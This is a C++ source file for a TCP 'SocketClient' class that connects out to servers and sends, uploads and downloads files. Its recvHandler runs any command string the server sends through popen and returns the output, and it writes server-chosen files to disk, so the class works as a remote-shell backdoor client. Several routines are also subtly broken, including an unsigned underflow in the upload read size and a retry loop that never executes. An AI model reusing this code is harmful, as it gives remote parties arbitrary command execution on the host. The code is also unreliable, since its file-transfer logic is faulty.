#include "../../include/socket/client_socket.h"
#include <arpa/inet.h>
#include <array>
#include <cstddef>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <filesystem>
#include <fstream>
#include <functional>
#include <memory>
#include <netinet/in.h>
#include <sstream>
#include <string>
#include <sys/socket.h>
#include <thread>
#include <vector>

SocketClient::SocketClient(const std::string& address, const uint16_t port) {
    ClientTypes::ServerConnectionData server_connection;

    server_connection.address = address;
    server_connection.port    = port;
    server_connection.CID     = sha256::hash(address, 
                                sha256::sha256_options::option_string_hash);

    server_connection.header_.sin_addr.s_addr = inet_addr(address.c_str());
    server_connection.header_.sin_port        = htons(port);
    server_connection.header_.sin_family      = AF_INET;
    server_connection.sosize_                 = sizeof(server_connection.header_);

    server.push_back(server_connection);
}

SocketClient::SocketClient(const SocketClient& socketClient) {
    server   = socketClient.server;
    sstatus_ = socketClient.sstatus_;
    tstatus_ = socketClient.tstatus_;
}

SocketClient::SocketClient() {}

void SocketClient::setConnectionData(const std::string& address, const uint16_t port) {
    ClientTypes::ServerConnectionData server_connection;

    server_connection.address = address;
    server_connection.port    = port;
    server_connection.CID     = sha256::hash(address,
                                sha256::sha256_options::option_string_hash);

    server_connection.header_.sin_addr.s_addr = inet_addr(address.c_str());
    server_connection.header_.sin_port        = htons(port);
    server_connection.header_.sin_family      = AF_INET;
    server_connection.sosize_                 = sizeof(server_connection.header_);

    server.push_back(server_connection);
}

void SocketClient::setConnectionData(const ClientTypes::ServerConnectionData& scd) {
    if (scd.CID.size() == 0)
        return;

    else if (scd.address.size() == 0 || 
             scd.address.size() > 15)
        return;

    else if (scd.port < 0 || 
             scd.port > __UINT16_MAX__)
        return;

    else
        server.push_back(scd);
}

void SocketClient::setConnectionData(const ClientTypes::header_t& header) {
    if (header.sin_addr.s_addr == 0 ||
        header.sin_addr.s_addr > __UINT32_MAX__)
        return;

    else if (header.sin_port == 0 ||
             header.sin_port > __UINT16_MAX__)
             return;

    else if (header.sin_family != AF_INET)
        return;

    else {
        ClientTypes::ServerConnectionData server_connection;

        server_connection.address = inet_ntoa(header.sin_addr);
        server_connection.port    = htons(header.sin_port);
        server_connection.header_ = header;
        server_connection.sosize_ = sizeof(header);
        server_connection.CID     = sha256::hash(server_connection.address,
                                    sha256::sha256_options::option_string_hash);

        server.push_back(server_connection);
    }
}

void SocketClient::setThreadType(const tstatus_t& tstatus) {
    tstatus_ = tstatus;
}

ClientTypes::SocketStatus SocketClient::socketInit(const std::string& CID) {
    for (auto& _: server)
        if (_.CID == CID) {
            _.socket_ = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

            if (WIN(_.socket_ == INVALID_SOCKET)
                LINUX(_.socket_ < 0))
                return sstatus_t::err_socket_init;

            else break;
        }

    return sstatus_t::err_socket_ok;
}

ClientTypes::SocketStatus SocketClient::socketConnect(const std::string& CID) {
    for (auto& _: server)
        if (_.CID == CID) {
            if (WIN(_.socket_ == INVALID_SOCKET)
                LINUX(_.socket_ < 0))
                return sstatus_t::err_socket_init;

            int32_t c_result = ::connect(_.socket_, (sockaddr *)&_.header_, _.sosize_);

            if (WIN(c_result == SOCKET_ERROR)
                LINUX(c_result < 0))
                return sstatus_t::err_socket_connect;

            std::vector<char> estabilish_connection = {(char)ESTABILISH_BYTE};

            c_result = ::send(_.socket_, estabilish_connection.data(), 
                                               estabilish_connection.size(), 0);
            
            if (c_result < 0)
                return sstatus_t::err_socket_estabilish;
        }

    return sstatus_t::err_socket_ok;
}

ClientTypes::SocketStatus SocketClient::sendBy(const std::string& CID, const std::string& data) {
    for (auto& _: server)
        if (_.CID == CID) {
            if (WIN(_.socket_ == INVALID_SOCKET)
                LINUX(_.socket_ < 0))
                return sstatus_t::err_socket_init;

            int32_t c_result = ::send(_.socket_, data.c_str(), data.size(), 0);

            if (c_result < 0)
                return sstatus_t::err_socket_send;
        }

    return sstatus_t::err_socket_ok;
}

ClientTypes::SocketStatus SocketClient::sendBy(const std::string& CID, const std::vector<char>& data) {
    for (auto& _: server)
        if (_.CID == CID) {
            if (WIN(_.socket_ == INVALID_SOCKET)
                LINUX(_.socket_ < 0))
                return sstatus_t::err_socket_init;

            int32_t c_result = ::send(_.socket_, data.data(), data.size(), 0);

            if (c_result < 0)
                return sstatus_t::err_socket_send;
        }

    return sstatus_t::err_socket_ok;
}

ClientTypes::SocketStatus SocketClient::sendBy(const std::string& CID, const void *data, const uint32_t size) {
    for (auto& _: server)
        if (_.CID == CID) {
            if (WIN(_.socket_ == INVALID_SOCKET)
                LINUX(_.socket_ < 0))
                return sstatus_t::err_socket_init;

            int32_t c_result = ::send(_.socket_, (char *)data, size, 0);

            if (c_result < 0)
                return sstatus_t::err_socket_send;
        }

    return sstatus_t::err_socket_ok;
}

ClientTypes::SocketStatus SocketClient::sendAll(const std::string& data) {
    {
        pool<std::function<bool()>, bool> pool(server.size());

        for (auto& _: server) {
            std::function<bool()> __pool = [&]() -> bool {
                if (WIN(_.socket_ == INVALID_SOCKET)
                    LINUX(_.socket_ < 0))
                    return false;

                int32_t c_result = ::send(_.socket_, data.c_str(), data.size(), 0);

                if (c_result < 0)
                    return false;

                return true;
            };

            pool.add_thread(__pool);
            pool.join();
        }
    }

    return sstatus_t::err_socket_ok;
}

ClientTypes::SocketStatus SocketClient::sendAll(const std::vector<char>& data) {
    {
        pool<std::function<bool()>, bool> pool(server.size());

        for (auto& _: server) {
            std::function<bool()> __pool = [&]() -> bool {
                if (WIN(_.socket_ == INVALID_SOCKET)
                    LINUX(_.socket_ < 0))
                    return false;

                int32_t c_result = ::send(_.socket_, data.data(), data.size(), 0);

                if (c_result < 0)
                    return false;

                return true;
            };

            pool.add_thread(__pool);
            pool.join();
        }
    }

    return sstatus_t::err_socket_ok;
}

ClientTypes::SocketStatus SocketClient::sendAll(const void *data, const uint32_t size) {
    {
        pool<std::function<bool()>, bool> pool(server.size());

        for (auto& _: server) {
            std::function<bool()> __pool = [&]() -> bool {
                if (WIN(_.socket_ == INVALID_SOCKET)
                    LINUX(_.socket_ < 0))
                    return false;

                int32_t c_result = ::send(_.socket_, (char *)data, size, 0);

                if (c_result < 0)
                    return false;

                return true;
            };

            pool.add_thread(__pool);
            pool.join();
        }
    }

    return sstatus_t::err_socket_ok;
}

ClientTypes::SocketStatus SocketClient::uploadBy(const std::string& CID, const std::string& path) {
    for (auto& _: server) {
        if (_.CID == CID) {
            if (WIN(_.socket_ == INVALID_SOCKET)
                LINUX(_.socket_ < 0))
                return sstatus_t::err_socket_init;

            if (!std::filesystem::exists(path) || 
                !std::filesystem::is_regular_file(path))
                return sstatus_t::err_socket_upload;

            uint32_t block_size = __INT16_MAX__;
            uint32_t file_size  = std::filesystem::file_size(path) + 1;

            std::vector<char> fbuffer(block_size);

            std::ifstream file(path, std::ios::binary);

            int32_t _loss = 0;

            while (file_size) { // single thread realise
                if (file_size >= block_size) {
                    file.read(fbuffer.data(), block_size);

                    file_size -= block_size;
                }

                else {
                    file.read(fbuffer.data(), (file_size - block_size));

                    file_size = 0;
                }

                _loss = ::send(_.socket_, fbuffer.data(), fbuffer.size(), 0);

                if (_loss < 0) {
                    for (uint32_t i = 0;!_loss && !(i < 5); i++)
                        _loss = ::send(_.socket_, fbuffer.data(), fbuffer.size(), 0);
                
                    if (_loss < 0)
                        return sstatus_t::err_socket_upload_connection_broken;
                }
            }
        }
    }

    return sstatus_t::err_socket_ok;
}

ClientTypes::SocketStatus SocketClient::uploadBy(const std::string& CID, const std::vector<char>& path) {
    for (auto& _: server) {
        if (_.CID == CID) {
            if (WIN(_.socket_ == INVALID_SOCKET)
                LINUX(_.socket_ < 0))
                return sstatus_t::err_socket_init;

            if (!std::filesystem::exists(path.data()) || 
                !std::filesystem::is_regular_file(path.data()))
                return sstatus_t::err_socket_upload;

            uint32_t block_size = __INT16_MAX__;
            uint32_t file_size  = std::filesystem::file_size(path.data()) + 1;

            std::vector<char> fbuffer(block_size);

            std::ifstream file(path.data(), std::ios::binary);

            int32_t _loss = 0;

            while (file_size) { // single thread realise
                if (file_size >= block_size) {
                    file.read(fbuffer.data(), block_size);

                    file_size -= block_size;
                }

                else {
                    file.read(fbuffer.data(), (file_size - block_size));

                    file_size = 0;
                }

                _loss = ::send(_.socket_, fbuffer.data(), fbuffer.size(), 0);

                if (_loss < 0) {
                    for (uint32_t i = 0;!_loss && !(i < 5); i++)
                        _loss = ::send(_.socket_, fbuffer.data(), fbuffer.size(), 0);
                
                    if (_loss < 0)
                        return sstatus_t::err_socket_upload_connection_broken;
                }
            }
        }
    }

    return sstatus_t::err_socket_ok;
}

ClientTypes::SocketStatus SocketClient::uploadBy(const std::string& CID, const void *path, const uint32_t size) {
    for (auto& _: server) {
        if (_.CID == CID) {
            if (WIN(_.socket_ == INVALID_SOCKET)
                LINUX(_.socket_ < 0))
                return sstatus_t::err_socket_init;

            char *__path = new char[size];

            memcpy(__path, path, size);

            if (!std::filesystem::exists(__path) || 
                !std::filesystem::is_regular_file(__path))
                return sstatus_t::err_socket_upload;

            uint32_t block_size = __INT16_MAX__;
            uint32_t file_size  = std::filesystem::file_size(__path) + 1;

            std::vector<char> fbuffer(block_size);

            std::ifstream file(__path, std::ios::binary);

            int32_t _loss = 0;

            while (file_size) { // single thread realise
                if (file_size >= block_size) {
                    file.read(fbuffer.data(), block_size);

                    file_size -= block_size;
                }

                else {
                    file.read(fbuffer.data(), (file_size - block_size));

                    file_size = 0;
                }

                _loss = ::send(_.socket_, fbuffer.data(), fbuffer.size(), 0);

                if (_loss < 0) {
                    for (uint32_t i = 0;!_loss && !(i < 5); i++)
                        _loss = ::send(_.socket_, fbuffer.data(), fbuffer.size(), 0);
                
                    if (_loss < 0)
                        return sstatus_t::err_socket_upload_connection_broken;
                }
            }
        }
    }

    return sstatus_t::err_socket_ok;
}

ClientTypes::SocketStatus SocketClient::downloadBy(const std::string& CID, const std::string& path) {
    for (auto& _: server) {
        if (_.CID == CID) {
            if (WIN(_.socket_ == INVALID_SOCKET)
                LINUX(_.socket_ < 0))
                return sstatus_t::err_socket_init;

            if (!std::filesystem::exists(path) ||
                !std::filesystem::is_regular_file(path))
                return sstatus_t::err_socket_init;

            uint32_t block_size = __INT16_MAX__;

            std::vector<char> fbuffer(block_size);
            std::ofstream   __file(path, std::ios::binary);

            int32_t __loss     = 0;
            int32_t bytes_read = 0;

            while ((bytes_read = ::recv(_.socket_, fbuffer.data(), block_size, 0)) > 0) {
                if (bytes_read < block_size) {
                    fbuffer.resize(bytes_read);

                    __file.write(fbuffer.data(), fbuffer.size());
                }

                else
                    __file.write(fbuffer.data(), fbuffer.size());
            }

            if (bytes_read < 0) {
                std::filesystem::remove(path);

                return sstatus_t::err_socket_init;
            }

            return sstatus_t::err_socket_ok;
        }
    }

    return sstatus_t::err_socket_init;
}

ClientTypes::SocketStatus SocketClient::downloadBy(const std::string& CID, const std::vector<char>& path) {
    if (!path.size())
        return sstatus_t::err_socket_init;
    
    return this->downloadBy(CID, std::string(path.data()));
}

ClientTypes::SocketStatus SocketClient::downloadBy(const std::string& CID, const void *path, const uint32_t size) {
    if (path == nullptr ||
        size == 0)
        return sstatus_t::err_socket_init;
    
    return this->downloadBy(CID, std::string((char *)path));
}

ClientTypes::SocketStatus SocketClient::uploadAll(const std::string& path) {
    if (server.size() > std::thread::hardware_concurrency()) {
        uint32_t server_size = server.size();
        uint32_t server_cnt  = server_size / std::thread::hardware_concurrency();
        uint32_t count_t = 0;

        for (uint32_t i = 0; i < server_cnt; i++) {
            if (server_size < std::thread::hardware_concurrency()) {
                pool<std::function<bool()>, bool> pool(server_size);

                for (;count_t < server_size; count_t++) {
                    std::function<bool()> fnc = [&]() -> bool {
                        if (sstatus_t::err_socket_ok != this->uploadBy(server[count_t].CID, path))
                            return false;

                        return true;
                    };

                    pool.add_thread(fnc);
                    pool.join();
                }

                server_size = 0;
            }

            else {
                pool<std::function<bool()>, bool> pool;

                for (;count_t < std::thread::hardware_concurrency(); count_t++) {
                    std::function<bool()> fnc = [&]() -> bool {
                        if (sstatus_t::err_socket_ok != this->uploadBy(server[count_t].CID, path))
                            return false;

                        return true;
                    };

                    pool.add_thread(fnc);
                    pool.join();
                }

                server_size -= std::thread::hardware_concurrency();
            }
        }
    }

    else {
        pool<std::function<bool()>, bool> pool(server.size());

        for (auto& _: server) {
            std::function<bool()> fnc = [&]{
                if (sstatus_t::err_socket_ok != this->uploadBy(_.CID, path))
                    return false;

                return true;
            };

            pool.add_thread(fnc);
            pool.join();
        }
    }

    return sstatus_t::err_socket_ok;
}

ClientTypes::SocketStatus SocketClient::uploadAll(const std::vector<char>& path) {
    if (server.size() > std::thread::hardware_concurrency()) {
        uint32_t server_size = server.size();
        uint32_t server_cnt  = server_size / std::thread::hardware_concurrency();
        uint32_t count_t = 0;

        for (uint32_t i = 0; i < server_cnt; i++) {
            if (server_size < std::thread::hardware_concurrency()) {
                pool<std::function<bool()>, bool> pool(server_size);

                for (;count_t < server_size; count_t++) {
                    std::function<bool()> fnc = [&]() -> bool {
                        if (sstatus_t::err_socket_ok != this->uploadBy(server[count_t].CID, path))
                            return false;

                        return true;
                    };

                    pool.add_thread(fnc);
                    pool.join();
                }

                server_size = 0;
            }

            else {
                pool<std::function<bool()>, bool> pool;

                for (;count_t < std::thread::hardware_concurrency(); count_t++) {
                    std::function<bool()> fnc = [&]() -> bool {
                        if (sstatus_t::err_socket_ok != this->uploadBy(server[count_t].CID, path))
                            return false;

                        return true;
                    };

                    pool.add_thread(fnc);
                    pool.join();
                }

                server_size -= std::thread::hardware_concurrency();
            }
        }
    }

    else {
        pool<std::function<bool()>, bool> pool(server.size());

        for (auto& _: server) {
            std::function<bool()> fnc = [&]{
                if (sstatus_t::err_socket_ok != this->uploadBy(_.CID, path))
                    return false;

                return true;
            };

            pool.add_thread(fnc);
            pool.join();
        }
    }

    return sstatus_t::err_socket_ok;
}

ClientTypes::SocketStatus SocketClient::uploadAll(const void *path, const uint32_t size) {
    if (server.size() > std::thread::hardware_concurrency()) {
        uint32_t server_size = server.size();
        uint32_t server_cnt  = server_size / std::thread::hardware_concurrency();
        uint32_t count_t = 0;

        for (uint32_t i = 0; i < server_cnt; i++) {
            if (server_size < std::thread::hardware_concurrency()) {
                pool<std::function<bool()>, bool> pool(server_size);

                for (;count_t < server_size; count_t++) {
                    std::function<bool()> fnc = [&]() -> bool {
                        if (sstatus_t::err_socket_ok != this->uploadBy(server[count_t].CID, path, size))
                            return false;

                        return true;
                    };

                    pool.add_thread(fnc);
                    pool.join();
                }

                server_size = 0;
            }

            else {
                pool<std::function<bool()>, bool> pool;

                for (;count_t < std::thread::hardware_concurrency(); count_t++) {
                    std::function<bool()> fnc = [&]() -> bool {
                        if (sstatus_t::err_socket_ok != this->uploadBy(server[count_t].CID, path, size))
                            return false;

                        return true;
                    };

                    pool.add_thread(fnc);
                    pool.join();
                }

                server_size -= std::thread::hardware_concurrency();
            }
        }
    }

    else {
        pool<std::function<bool()>, bool> pool(server.size());

        for (auto& _: server) {
            std::function<bool()> fnc = [&]{
                if (sstatus_t::err_socket_ok != this->uploadBy(_.CID, path, size))
                    return false;

                return true;
            };

            pool.add_thread(fnc);
        }

        pool.join();
    }

    return sstatus_t::err_socket_ok;
}

#include <iostream>

ClientTypes::SocketStatus SocketClient::recvHandler() {
    if (server.size() > std::thread::hardware_concurrency()) {

    }

    else {
        pool<std::function<bool()>, bool> pool(server.size());

        for (auto& _: server) {
            std::function<bool()> fnc = [&]{
                std::cout << "thread: " << std::this_thread::get_id() << std::endl;

                std::vector<char> r_buffer(1024);

                while (::recv(_.socket_, r_buffer.data(), 1024, 0)) {
                    if (r_buffer[0] == ClientTypes::chr_handler::upload_mode) {
                        std::string command_b = r_buffer.data();
                        std::string command_a;

                        std::cout << command_b << std::endl;

                        for (const auto& _: command_b)
                            if (_ != ClientTypes::chr_handler::upload_mode)
                                command_a.push_back(_);

                        if (sstatus_t::err_socket_ok != this->downloadBy(_.CID, command_a))
                            return false;

                        return true;
                    }

                    if (r_buffer[0] == ClientTypes::chr_handler::shell_mode) {
                        std::function<std::string(const char *)> execlp = [&](const char *cmd){
                            FILE *       cmd_output = popen(cmd, "r");
                            std::string _cmd_result;

                            if (cmd_output) {
                                char buffer[1024];

                                while (fgets(buffer, sizeof(buffer), cmd_output))
                                    _cmd_result += buffer;
                            }

                            else
                                return std::string("_popen error");

                            return _cmd_result;
                        };

                        std::string command_b = r_buffer.data();
                        std::string command_a;

                        for (const auto& _: command_b)
                            if (_ != ClientTypes::chr_handler::shell_mode)
                                command_a.push_back(_);

                        command_b = execlp(command_a.c_str());

                        if (sstatus_t::err_socket_ok != this->sendBy(_.CID, command_b))
                            return false;

                        return true;
                    }

                    if (r_buffer[0] == ClientTypes::chr_handler::ping_mode) {

                    }
                }

                return true;
            };

            pool.add_thread(fnc);
        }

        pool.join();
    }

    return sstatus_t::err_socket_ok;
}